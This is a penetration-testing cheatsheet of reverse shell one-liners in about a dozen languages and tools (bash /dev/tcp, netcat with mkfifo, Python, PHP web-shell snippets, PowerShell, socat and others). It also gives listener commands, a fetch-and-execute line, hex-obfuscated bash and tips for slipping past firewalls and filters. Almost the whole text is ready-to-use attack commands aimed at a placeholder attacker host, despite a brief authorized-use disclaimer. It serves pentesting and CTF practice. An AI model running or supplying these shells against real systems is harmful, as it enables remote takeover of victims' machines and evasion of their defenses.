# Reverse Shell Commands Cheatsheet

This cheatsheet provides a collection of common reverse shell commands for various environments and languages. These are typically used for educational purposes, penetration testing (with explicit permission), or CTF challenges.

An excellent online resource for generating and encoding these commands is [https://revshells.com](https://revshells.com).

**Important:** Only use these techniques on systems you own or have explicit, written permission to test. Unauthorized access to computer systems is illegal.

## Bash

**TCP (using `/dev/tcp` - works if the shell is `bash`):**
```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1
```

**Alternative syntax using `-c` to execute the command:**
```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'
```

**Same as above but using double quotes (useful for variable substitution):**
```bash
bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"
```

**Alternative with explicit redirection:**
```bash
exec 5<>/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>
cat <&5 | while read line; do $line 2>&5 >&5; done
```

**Using `mknod` and `telnet`:**
```bash
mknod backpipe p
telnet <ATTACKER_IP> <ATTACKER_PORT> 0<backpipe | /bin/bash 1>backpipe 2>backpipe
```

**Bash with `coproc` (Bash 4.0+):**
```bash
coproc bash { bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1; }; exec 0<&${bash[0]}; exec 1>&${bash[1]}; exec 2>&${bash[1]}
```

## Netcat (nc)

**Traditional Netcat (often `-e` flag is available):**
```bash
nc -e /bin/bash <ATTACKER_IP> <ATTACKER_PORT>
```

**Same as above but using `/bin/sh` instead of `/bin/bash`:**
```bash
nc -e /bin/sh <ATTACKER_IP> <ATTACKER_PORT>
```

**Alternative syntax using `-c` to specify the command:**
```bash
nc -c bash <ATTACKER_IP> <ATTACKER_PORT>
```

**OpenBSD Netcat (without `-e`, using `mkfifo`):**
```bash
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f
```

**Alternative for OpenBSD Netcat (using `mknod`):**
```bash
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc <ATTACKER_IP> <ATTACKER_PORT> 1>/tmp/backpipe
```

**Netcat without -e flag (Alternative method using two netcat instances on different ports):**
*Note: This requires the attacker to listen on both ports.*
```bash
nc <ATTACKER_IP> <ATTACKER_PORT_1> | /bin/bash | nc <ATTACKER_IP> <ATTACKER_PORT_2>
```

## Python

**Python 2:**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Python 3:**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Shorter Python 3 (if `os` and `pty` are available):**
```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

**Python fetching and executing a remote script:**
```python
python3 -c 'import urllib.request;exec(urllib.request.urlopen("http://<ATTACKER_IP>/revshell.py").read())'
```

## Perl

```perl
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<ATTACKER_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## PHP

```php
php -r '$sock=fsockopen("<ATTACKER_IP>",<ATTACKER_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**For use in a PHP web shell context (e.g., with `system`, `exec`, `passthru`):**
```php
<?php system('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"'); ?>
```

**PHP One-liner (Embeds a bash reverse shell command within PHP code):**
```php
<?php system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'"); ?>
```

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("<ATTACKER_IP>",<ATTACKER_PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## PowerShell (Windows)

**Standard PowerShell Reverse Shell:**
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",<ATTACKER_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**PowerShell encoded command (for obfuscation):**
```powershell
powershell -Enc <Base64_Encoded_Payload>
```

## Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
*(This is a snippet, not a complete Java program. It would be used within a larger Java application context, often in an exploit payload for deserialization vulnerabilities like the one in the Keras model).*

## Lua

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<ATTACKER_IP>','<ATTACKER_PORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/<ATTACKER_IP>/<ATTACKER_PORT>"; while(1) { printf "> " |& s; if ((s |& getline c) > 0) print c |& s; close(c)}}'
```

## Node.js

```javascript
node -e 'sh=require("child_process").spawn("/bin/bash",[],{stdio:["pipe","pipe","pipe"]});s=require("net").Socket().connect(<ATTACKER_PORT>,"<ATTACKER_IP>",()=>{s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s)})'
```

## Golang

```bash
echo 'package main;import("net";"os/exec");func main(){c,_:=net.Dial("tcp","<ATTACKER_IP>:<ATTACKER_PORT>");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Socat

**If `socat` is available on the target:**
```bash
socat tcp-connect:<ATTACKER_IP>:<ATTACKER_PORT> exec:/bin/bash,pty,stderr
```
(You would listen with `socat file:`tty`,raw,echo=0 tcp-listen:<ATTACKER_PORT>`).

## Obfuscated Bash

**Using `xxd` to encode and then decode:**
```bash
echo "<HEX_ENCODED_SHELL_COMMAND>" | xxd -r -p | bash
```
Example (the hex string represents `bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1`):
```bash
echo "62617368202d69203e26202f6465762f7463702f3c41545441434b45525f49503e2f3c41545441434b45525f504f52543e20303e2631" | xxd -r -p | bash
```

## Listener Commands (On Attacker Machine)

To catch the reverse shell, you typically use a listener. `netcat` (nc) is the most common:

**Basic Listener:**
```bash
nc -lvnp <ATTACKER_PORT>
```
*   `-l`: Listen mode
*   `-v`: Verbose output
*   `-n`: Numeric-only IP addresses (no DNS lookups)
*   `-p`: Local port number

**More verbose version showing additional connection details:**
```bash
nc -lvp <ATTACKER_PORT>
```

**Using `rlwrap` for better shell experience (if available):**
```bash
rlwrap nc -lvnp <ATTACKER_PORT>
```
`rlwrap` adds readline support (history, line editing) to the netcat listener, which can be very helpful for interactive shells.

**Using `socat` (more robust):**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:<ATTACKER_PORT>
```
Or for a full TTY:
```bash
socat tcp-listen:<ATTACKER_PORT>,reuseaddr,fork exec:/bin/bash,pty,stderr,sigint,sane
```

**Listener Tools:**
*   `penelope`: A modern reverse shell handler. (GitHub: https://github.com/brightio/penelope)
*   `pwncat-cs`: Enhances basic reverse shells. Install with `pipx install pwncat-cs`.

**Metasploit Listener:**
```bash
# Configures Metasploit to handle reverse shells
use exploit/multi/handler
set PAYLOAD <payload_type>  # e.g., windows/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <ATTACKER_PORT>
run
```

## Notes

*   **Shell Stability:** Reverse shells obtained are often not full TTYs. For better interaction (e.g., using `su`, `sudo`, text editors like `vim`), you might need to stabilize the shell. Common techniques involve using `python` or `script` to allocate a PTY.
    *   `python -c 'import pty; pty.spawn("/bin/bash")'`
    *   `script /dev/null` (then `Ctrl+Z`, `stty raw -echo`, `fg`, `reset`, `export TERM=xterm`)
*   **Firewall/Egress Filtering:** Reverse shells are often more successful than bind shells because they egress on common ports (like 80, 443) or because firewalls are less restrictive for outbound connections. Try using a common port like 80, 443, 53 if you encounter trouble with firewalls.
*   **Encoding:** Sometimes, special characters in commands need to be URL-encoded or base64-encoded to avoid issues with interpretation by intermediate systems (e.g., web application firewalls). Online tools like CyberChef can be used for encoding/decoding.
*   **Web Shells:** When injecting into web applications, you might need to prepend commands with `bash -c` to ensure they are executed correctly in a shell context.
*   **Length Limits & Filters:** If there are strict length limits or command filters, techniques like fetching a script from a remote server (`curl ... | bash`) or using encoding (`xxd`, Base64) can be very effective.
*   Replace `<ATTACKER_IP>` with your attacking machine's IP address (e.g., your `tun0` interface IP).
*   Replace `<ATTACKER_PORT>` with your desired port number.